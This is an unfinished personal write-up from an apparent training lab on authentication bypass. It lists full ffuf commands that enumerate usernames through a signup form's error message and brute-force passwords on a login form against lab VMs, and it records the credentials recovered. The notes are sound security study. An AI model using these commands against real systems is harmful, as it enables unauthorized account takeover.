# Authentication Bypass

**Date Completed:**  in progress

## Tools Used
- [x] ffuf
- [ ]  

## Method (What I Did)

**Username Enumeration - ffuf**
- Used ffuf to brute-force / enumerate valid usernames on a signup form by abusing the “username already exists” error message.
- Used `ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"` to discover all valid usernames for the the URL `http://10.201.115.109/customers/signup` (VM Only)
- Placed results in txt file for later use which contained `admin, robert, simon, steve`

**Password Brute Force**
- New path used `http://10.201.53.115/customers/login` (VM Only)
- Used `ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.201.53.115/customers/login -fc 200` to execute valid usernames with possible passwords.
- Result lead to `username=Steve` and `password=thunder` (succesful employee login)

**


## Key Takeaway
- ...

